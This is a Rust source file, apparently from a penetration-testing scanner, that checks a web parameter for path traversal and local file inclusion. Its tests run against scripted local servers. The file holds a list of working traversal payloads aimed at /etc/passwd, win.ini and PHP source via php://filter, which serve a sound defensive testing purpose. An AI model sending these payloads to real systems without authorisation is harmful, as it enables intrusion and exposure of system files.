//! traversal — Path Traversal / Local File Inclusion.
//!
//! Port of `checks/traversal.py`.

use crate::opts::Opts;
use crate::registry::CheckFuture;
use pentest_core::{Finding, HttpClient, HttpRequest, Severity};
use std::sync::LazyLock;

pub const NAME: &str = "traversal";

static PASSWD_RE: LazyLock<regex::Regex> = LazyLock::new(|| regex::Regex::new(r"root:.*:0:0:").unwrap());
static WININI_RE: LazyLock<regex::Regex> = LazyLock::new(|| regex::Regex::new(r"(?i)\[(?:fonts|extensions|mci extensions)\]").unwrap());
static PHP_RE: LazyLock<regex::Regex> = LazyLock::new(|| regex::Regex::new(r"<\?php").unwrap());

fn payloads() -> Vec<String> {
    vec![
        "../../../../../../etc/passwd".to_string(),
        "..%2f..%2f..%2f..%2f..%2fetc%2fpasswd".to_string(),
        "....//....//....//....//etc/passwd".to_string(),
        "/etc/passwd".to_string(),
        format!("{}etc/passwd", "%2e%2e%2f".repeat(6)),
        "..\\..\\..\\..\\windows\\win.ini".to_string(),
        "..%5c..%5c..%5c..%5cwindows%5cwin.ini".to_string(),
        "php://filter/convert.base64-encode/resource=index".to_string(),
    ]
}

async fn send(client: &HttpClient, method: &str, param: &str, val: &str) -> Option<pentest_core::HttpResponse> {
    let req = if method == "POST" { HttpRequest::post().form_field(param, val) } else { HttpRequest::get().param(param, val) };
    client.request(req).await.ok()
}

pub fn run<'a>(client: &'a HttpClient, opts: &'a Opts) -> CheckFuture<'a> {
    Box::pin(run_impl(client, opts))
}

async fn run_impl(client: &HttpClient, opts: &Opts) -> Vec<Finding> {
    let mut out = Vec::new();
    let Some(param) = &opts.param else {
        return out;
    };
    let method = opts.method.to_uppercase();

    for p in payloads() {
        let Some(r) = send(client, &method, param, &p).await else { continue };
        if let Some(m) = PASSWD_RE.find(&r.body) {
            let line = r.body[m.start()..(m.start() + 80).min(r.body.len())].lines().next().unwrap_or("").to_string();
            let mut fnd = Finding::new(NAME, Severity::Critical, "Path traversal / LFI (Unix)", format!("payload {p:?} read /etc/passwd")).with_evidence(line.clone());
            fnd.payload = p;
            fnd.proof = format!("leaked /etc/passwd: {line}");
            out.push(fnd);
            break;
        }
        if WININI_RE.is_match(&r.body) {
            let snippet: String = r.body.chars().take(80).collect();
            let mut fnd = Finding::new(NAME, Severity::Critical, "Path traversal / LFI (Windows)", format!("payload {p:?} read win.ini")).with_evidence(snippet.clone());
            fnd.payload = p;
            fnd.proof = format!("leaked win.ini: {snippet}");
            out.push(fnd);
            break;
        }
        if p.contains("php://filter") && PHP_RE.is_match(&r.body) {
            let snippet: String = r.body.chars().take(80).collect();
            let mut fnd = Finding::new(NAME, Severity::High, "PHP source disclosure via php://filter", format!("payload {p:?} exposed source")).with_evidence(snippet);
            fnd.payload = p;
            out.push(fnd);
            break;
        }
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::checks::test_support::{scripted_server, ScriptedResponse};
    use pentest_core::HttpClientConfig;

    fn fast_client(base_url: String) -> HttpClient {
        let config = HttpClientConfig { delay: std::time::Duration::from_millis(0), ..HttpClientConfig::default() };
        HttpClient::new(base_url, config)
    }

    #[tokio::test]
    async fn detects_unix_passwd_leak() {
        let base = scripted_server(|req, _| {
            let v = req.query.get("file").cloned().unwrap_or_default();
            if v.contains("etc/passwd") || v.contains("etc%2fpasswd") {
                ScriptedResponse::ok("root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1::/usr/sbin:/usr/sbin/nologin\n")
            } else {
                ScriptedResponse::ok("file not found")
            }
        })
        .await;
        let client = fast_client(base);
        let opts = Opts { param: Some("file".to_string()), ..Opts::default() };

        let findings = run_impl(&client, &opts).await;

        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].title, "Path traversal / LFI (Unix)");
        assert!(findings[0].proof.contains("root:"));
    }

    #[tokio::test]
    async fn detects_windows_win_ini_leak() {
        let base = scripted_server(|req, _| {
            let v = req.query.get("file").cloned().unwrap_or_default();
            if v.contains("win.ini") {
                ScriptedResponse::ok("[fonts]\r\n[extensions]\r\n")
            } else {
                ScriptedResponse::ok("file not found")
            }
        })
        .await;
        let client = fast_client(base);
        let opts = Opts { param: Some("file".to_string()), ..Opts::default() };

        let findings = run_impl(&client, &opts).await;

        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].title, "Path traversal / LFI (Windows)");
    }

    #[tokio::test]
    async fn detects_php_filter_source_disclosure() {
        // The check's own PHP_RE looks for a literal "<?php" tag in the
        // response body. Real php://filter output is base64-encoded (so a
        // correctly-configured target never matches this), but a
        // misconfigured or non-filtering target might return decoded
        // source directly -- that's the scenario this check catches.
        let base = scripted_server(|req, _| {
            let v = req.query.get("file").cloned().unwrap_or_default();
            if v.contains("php://filter") {
                ScriptedResponse::ok("<?php\necho \"hello\";\n")
            } else {
                ScriptedResponse::ok("file not found")
            }
        })
        .await;
        let client = fast_client(base);
        let opts = Opts { param: Some("file".to_string()), ..Opts::default() };

        let findings = run_impl(&client, &opts).await;

        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].title, "PHP source disclosure via php://filter");
        assert_eq!(findings[0].severity, Severity::High);
    }

    #[tokio::test]
    async fn no_findings_against_a_clean_target() {
        let base = scripted_server(|_req, _| ScriptedResponse::ok("nothing to see here")).await;
        let client = fast_client(base);
        let opts = Opts { param: Some("file".to_string()), ..Opts::default() };

        let findings = run_impl(&client, &opts).await;

        assert!(findings.is_empty());
    }

    #[tokio::test]
    async fn returns_empty_without_a_param() {
        let base = scripted_server(|_req, _| ScriptedResponse::ok("ok")).await;
        let client = fast_client(base);
        let findings = run_impl(&client, &Opts::default()).await;
        assert!(findings.is_empty());
    }
}
